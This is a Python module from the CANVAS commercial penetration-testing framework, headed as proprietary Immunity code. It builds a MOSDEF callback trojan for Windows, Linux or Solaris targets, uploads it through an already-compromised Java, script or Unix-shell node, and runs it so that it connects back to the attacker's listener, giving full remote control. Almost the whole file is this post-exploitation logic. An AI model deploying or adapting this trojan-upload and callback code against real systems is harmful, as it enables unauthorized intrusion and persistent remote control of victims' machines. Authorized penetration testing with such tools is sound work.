#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

import os,getopt
import socket
from exploitutils import *
import canvasengine
import time
from canvasexploit import canvasexploit

NAME                    = "converttomosdef"
DESCRIPTION             = "Builds, uploads and runs a MOSDEF callback trojan. This is useful when you have a less full-featured Node such as a PHP ScriptNode, JavaNode or UnixShell, and want the full MOSDEF capability."
DOCUMENTATION           = {}
VERSION                 = "1.0"

PROPERTY                = {}
PROPERTY['TYPE']        = "Commands"
PROPERTY['SITE']        = "Local"

class theexploit(canvasexploit):
    def __init__(self):
        canvasexploit.__init__(self)
        self.result = ""
        self.name   = NAME
        return
    
    def neededListenerTypes(self):
        def getSol(os):
            if os.arch.lower() in ['x86', 'i386']:
                return canvasengine.SOLARISMOSDEF_INTEL
            else:
                return canvasengine.SOLARISMOSDEF_SPARC
            
        passednodes = self.argsDict["passednodes"]
        listenerMap = {"WINDOWS" : canvasengine.WIN32MOSDEF_INTEL, "LINUX" : canvasengine.LINUXMOSDEF_INTEL, "SOLARIS" : getSol } # Test and add MacOSX, Sol, etc.

        rv = []
        for n in passednodes:
            target_os = n.getHostOS()
            if target_os.base.upper() in listenerMap.keys():
                if callable(listenerMap[target_os.base.upper()]):
                    l = listenerMap[target_os.base.upper()](target_os)
                else:
                    l = listenerMap[target_os.base.upper()]
                if l not in rv:                    
                    rv.append(l)
            else:
                self.log("No listener type is configured for os %s on node %s" % (target_os, n.get_name()))
        if len(rv) > 1:
            self.log("More than one listener type required, which isn't supported yet, sorry. You'll probably only get some of your shells.")
        
        return rv
        
    def run(self):
        self.setInfo("%s (in progress)"%(NAME))

        node        = self.argsDict["passednodes"][0]   
        self.result = []

        for node in self.argsDict["passednodes"]:
            nodetype = node.nodetype

            if nodetype.upper() in ["JAVANODE", "SCRIPTNODE", "UNIXSHELLNODE"]: # What about SQLNode?
                target_os = node.getHostOS()
                if target_os != None:
                    fn = self.uploadmosdeftrojan(target_os=target_os, node=node)
                    if fn not in [0, False]:
                        self.log("Running mosdef callback command:%s" % fn)
                        if node.capabilities.count("spawn"):
                            self.log("Remote node supports spawn!")
                            r = node.spawn(fn)
                            succeeded = self.ISucceeded() #have to call this to check for the callback on remote nodes!
                        else:
                            self.log("After this command, the Node will be stuck!")
                            r = node.runcommand(fn)
                            # can't call self.ISucceeded here, as we're stuck! (This will fail to bounce!)
                        self.log("Run command returned: %s" % r)
                        self.result.append(1)
                    else:
                        self.log("Failed to build and upload trojan for node %s" % node.get_name())
                else: 
                    self.log("No OS information in knowledge for node %s" % node.get_name())
                    self.result += [0]
            else:
                self.log("The node named %s of type %s does not have the capabilities needed to run this command"%(node.get_name(),nodetype))
                self.result+=[0]
                
        if 1 in self.result:
            ret = 1
        else:
            ret = 0
        
        self.setInfo("%s - (finished)" % (NAME))
        return ret

